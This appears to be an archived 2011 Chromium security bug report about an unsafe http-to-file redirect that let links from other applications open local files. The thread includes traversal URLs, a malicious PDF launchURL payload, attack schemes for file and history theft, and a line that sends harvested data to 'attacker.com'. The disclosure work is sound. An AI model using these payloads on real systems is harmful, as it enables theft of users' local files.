# Cross application unsafe redirect

| Field | Value |
|-------|-------|
| **Issue ID** | [40087791](https://issues.chromium.org/issues/40087791) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Internals |
| **Reporter** | d0...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2011-02-09 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

In the case of Chrome as the browser default is possible to perform unsafe redirect from zone http: to zone file:

**VERSION**  

Chrome Version: [9.0.597.94] + [stable]  

Operating System: WinXP x64 SP2, WinXP x32 SP3, Win7

**REPRODUCTION CASE**

1. Click from any application i.e. Adobe Reader (not embedded) or GoogleTalk/ICQ on the link like this:  
   
   http://../  
   
   You see page like file:///C:/Documents%20and%20Settings/Administrator/Local%20Settings/Application%20Data/Google/Chrome/Application/9.0.597.94/

\* but it does not work out for the application directory through logical things like these:  

http://../../../../../../../../../../../../../boot.ini

2. I spent a lot of strength, while searching for a way to open any file on the disk. But this method has been found, it is based on deception %)

These link:

<http://www.google.ru?sclient=psy&q=omfg../#a/../../../../../../../../../../../../boot.ini>

From GTalk/ICQ/Reader will open file://C:/boot.ini

This can be used to steal local files and transfer them to a remote server. It's enough to get into the chrome Downloads directory html formatted file and SWF file. Then this vulnerability is to be used for opening the that local html formatted file.

## Attachments

- [10.02.2011 1-21-38.rar](attachments/10.02.2011 1-21-38.rar) (application/x-rar; charset=binary, 47.5 KB)
- [PoC-cache-based-history.rar](attachments/PoC-cache-based-history.rar) (application/x-rar; charset=binary, 565.9 KB)
- [poc](attachments/poc) (text/html; charset=us-ascii, 2.9 KB)
- [axe.pdf](attachments/axe.pdf) (application/pdf; charset=binary, 77.8 KB)

## Timeline

### lc...@gmail.com (2011-02-09)

We indeed seem to resolve this URL in the command line:

http://example.com/../../../../../../../../../../../../boot.ini

...as a reference to file:///c:/boot.ini. That looks like poor etiquette.

### d0...@gmail.com (2011-02-09)

Command line is quite unsuitable for the attack on the user, in contrast to the CAS.
You can not open local files on the links like this 

file://C:boot.ini 

from GTalk/ICQ, because only http: scheme is valid.
But you can use described trick to that.

Perhaps this is a veiled form of CrossApplicationScripting.
Do not see any reason to argue about the classification.


### d0...@gmail.com (2011-02-12)

lcamtif, sorry, could you say more clearly, whether you consider this vulnerability of browser or not?

As for you example: 
http://example.com/../../../../../../../../../../../../boot.ini
He will work through .lnk files and command line, but could not work from GTalk/ICQ/AcroReader 

### lc...@gmail.com (2011-02-12)

These applications invoke Chrome by passing the URL in the command line. I think it's a potential security bug, especially due to interactions with other browsers and plugins.

### d0...@gmail.com (2011-02-13)

FYI.

Here is a variation of attack history leakage *, which can hold the following reasons:
1. https://crbug.com/chromium/72492
2. Downloading without warning the user file with HTML content in the Downloads folder.
3. Interpretation HTML content in local files without extensions
4. Numbered cache files
5. Not denied access to images and their properties (width and height) from the cache folder.
6. In the zone file:// is allowed transitions to the pages in the zone http://. 

Scheme of attack:
1. User visits a malicious Web site. (Downloads directory gets poc file with html content)
2. User clicks on a malicious link in an application like gtalk/icq. (The browser opens a malicious html from step 1 threw link like this: http://google.com?q=asd../#a/../../../../../../../../../../My%20Documents/Downloads/poc)

*) http://jeremiahgrossman.blogspot.com/2006/08/i-know-where-youve-been.html

p.s. see attached PoC code and video.
p.p.s. the video does not demonstrate the use of p.6, which is only needed to pass the collected information to a remote server i.e. location='attacker.com?snif_me#'+rep_data


### js...@chromium.org (2011-02-14)

Assigning severity and making it a jump ball if anyone wants to grab it first.

### d0...@gmail.com (2011-02-15)

How you look at it to consider the method of transmitting user's browsing history as a separate vulnerability? (p.2-6 at @https://crbug.com/chromium/72492#c5).

But necessarily require opening html from file://


### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-03-22)

[Empty comment from Monorail migration]

### d0...@gmail.com (2011-04-15)

Can I hope that the fix for this vulnerability to take place before May 19?
I would use it as an example at the conference fdays ...

### js...@chromium.org (2011-04-15)

I can't get this to repro in Chrome 10. Did I miss something on the repro or did this get fixed?

### d0...@gmail.com (2011-04-16)

Still available.
Tested:
10.0.648.204
10.0.648.205
WinXP SP3.

>> "Operating System: WinXP x64 SP2, WinXP x32 SP3, Win7"

### sc...@gmail.com (2011-04-20)

@d0znpp: feel free to go ahead and present this on May 19th.
If we fix it in time we do, if we don't fix it in time.. we don't.
Mainly, we're grateful for the heads-up and advance notice of the deadline.

### d0...@gmail.com (2011-05-11)

YEPP!
Further study of this vulnerability have yielded results.

Tested on: 

Chrome 11.0.696.65
Reader 10.0.0.1
Flash 10.2.154.28

Windows XP x64 SP2
Windows XP SP3
Windows 7 SP1

@https://crbug.com/chromium/72492#c6:
Increasing threat. 

@all:
Possible to exploit this vulnerability to open a local file from a remote page.
Attacker can produce evil PDF with code:
app.launchURL("http://../../../../../../../My%20Documents/Downloads/",true)
and place it on remote host.
(hint: xfa.host.gotoURL() did not work at this case)

There are scheme of attack which provide attacker to get content of any local file.

1. Produce PDF with evil code:
app.launchURL("http://../../../../../../../My%20Documents/Downloads/",true)
2. Produce SWF with evil code, like that: http://chromium.googlecode.com/issues/attachment?aid=-4445344649039299016&name=LFI.mxml&token=9d3cea5574178a232ca1016b704801e6
3. Produce HTML page, that downloads the SWF file and displays the PDF.
4. Sniff SMB traffic on remote host to get data.

See the attachment.

Best regards!

### in...@chromium.org (2011-05-26)

Mass update to M12.

### in...@chromium.org (2011-05-26)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-07-06)

Moving all M12 bugs to M13. We won't have another M12 patch.

### in...@chromium.org (2011-07-07)

[Empty comment from Monorail migration]

### ma...@google.com (2011-07-19)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-08-04)

This bug is getting old; sorry about that.
I'm not sure it ever reproduced on Linux, but I have now procured a Windows development machine so I will take a look right away.

### sc...@gmail.com (2011-08-04)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-08-05)

This might even be easy to fix; we should have looked at it sooner but I only just got my Windows machine! Linux is OK.

@d0znpp: did you present this on May 19, in the end?

### d0...@gmail.com (2011-08-05)

I am very surprised that so little attention was paid to this bug,
because when I sent her, Chrome has not yet had a PDF Viewer by
default.
And it could be used to steal local files in 99%

Now that Chrome has a PDF Viewer by defualt, use this vulnerability to
steal local files only if a user opens a document in Adobe reader
inside the Chrome instead of Chrome PDF Viewer.
However, because of compatibility, users often do

I told the conference on May 19
http://www.youtube.com/watch?v=anEKOG8x5gM

### sc...@gmail.com (2011-08-05)

This was reported against Chrome 9; I think we've had a built-in PDF viewer since Chrome 8 or so.
I think the problem was a lack of appreciation for the impact of the bug rather than a lack of willingness :-/
Anyway, I expect to land a fix tomorrow and we'll get it in to Chrome 14 at the latest, and possibly a patch to Chrome 13.

### sc...@gmail.com (2011-08-06)

http://src.chromium.org/viewvc/chrome?view=rev&revision=95731

I'll merge the fix to M14; maybe not M13, we'll see.

### sc...@gmail.com (2011-08-09)

Merged to M14: r95929

### sc...@gmail.com (2011-08-12)

Merged to M13: r96564

### sc...@gmail.com (2011-08-16)

@d0znpp: thanks again for reporting this bug and sorry that it was not fixed to our usual fast standards.

Thank you for giving us a good heads-up about your plans to talk about this bug publicly. Our culture is that if you give us good notice, it is our fault (and not yours) that we didn't fix it before public disclosure. Therefore, the bug is still eligible for reward. The rewards panel liked some of the clever twists in this bug and therefore we would like to offer you a $1000 Chromium Security Reward. Congrats!

### sc...@gmail.com (2011-08-16)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-08-17)

@d0znpp: I will credit you as "d0znpp" unless I hear otherwise, but happy to use any other name you wish. Just let me know.

### d0...@gmail.com (2011-08-18)

my name is Vladimir Vorontsov, ONsec company. Please, credit that.

Aug 17, 2011, 

### sc...@gmail.com (2011-08-23)

@d0znpp: e-mail cevans@chromium.org for steps to collect your reward.

### sc...@gmail.com (2011-08-30)

Payment in system...

### js...@chromium.org (2011-10-05)

Batch update.

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed.. 

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-26)

This issue was migrated from crbug.com/chromium/72492?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40087791)*
